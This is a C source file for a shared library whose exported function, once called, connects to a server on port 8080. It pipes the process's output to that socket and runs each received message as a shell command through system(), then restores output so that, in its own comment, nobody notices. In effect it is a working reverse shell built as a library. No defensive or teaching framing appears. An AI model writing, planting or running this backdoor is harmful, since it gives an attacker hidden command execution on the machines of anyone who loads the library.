/* The source for the library
 * Use: `gcc library.c -shared -fPIC -o library.so` to compile it */
#include <netdb.h> 
#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 
#include <sys/socket.h> 
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

/* Use the code from client
 * Redirect all the standard and error output to sockfd to have a feedback on server
 * Execut the "messages" from server as commands */
#define MAX 1024
#define PORT 8080 
#define SA struct sockaddr 
static void func(int sockfd) 
{ 
    char buff[MAX]; 
	int old_stdout = 5,
		old_stderr = 6;
	// save the stdout for later
	if(dup2(fileno(stdout), old_stdout) == -1) {
		perror("dup2 save stdout");
		exit(1);
	}

	// replace stdout wit sockfd
	if(dup2(sockfd, 1) == -1) {
		perror("dup2 sockfd");
		exit(1);
	}
	// replace stderr with sockfd
	if(dup2(sockfd, 2) == -1) {
		perror("dup2 sockfd");
		exit(1);
	}
	bzero(buff, sizeof(buff)); 
	strcpy(buff, "empty\n");
	write(sockfd, buff, sizeof(buff)); 
    for (;;) { 
        bzero(buff, sizeof(buff)); 
        read(sockfd, buff, sizeof(buff)); 
        if ((strncmp(buff, "exit", 4)) == 0) { 
            printf("Client Exit...\n"); 
            break; 
        } 
		system(buff);
    } 
	// put stdout back and hope nobady observed
	if(dup2(old_stdout, 1) == -1) {
		perror("dup2 set back stdout");
		exit(1);
	}
	if(dup2(old_stderr, 2) == -1) {
		perror("dup2 set back stderr");
		exit(1);
	}
	printf("stdout back to normal\n");
	fprintf(stderr, "stderr back to normal\n");
} 
  
static int connect_to_server() 
{ 
    int sockfd, connfd; 
    struct sockaddr_in servaddr; 
  
    // socket create and varification 
    sockfd = socket(AF_INET, SOCK_STREAM, 0); 
    if (sockfd == -1) { 
        fprintf(stderr, "socket creation failed...\n"); 
        exit(0); 
    } 
    else
        fprintf(stderr, "Socket successfully created..\n"); 
    bzero(&servaddr, sizeof(servaddr)); 
  
    // assign IP, PORT 
    servaddr.sin_family = AF_INET; 
    servaddr.sin_addr.s_addr = inet_addr("127.0.0.1"); 
    servaddr.sin_port = htons(PORT); 
  
    // connect the client socket to server socket 
    if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr)) != 0) { 
        fprintf(stderr, "connection with the server failed...\n"); 
        exit(0); 
    } 
    else
        fprintf(stderr, "connected to the server..\n"); 
  
    // function for chat 
    func(sockfd); 
  
    // close the socket 
    close(sockfd); 
} 


int MyFunction()
{
	printf("library\n");
	connect_to_server();
	return 0;
}
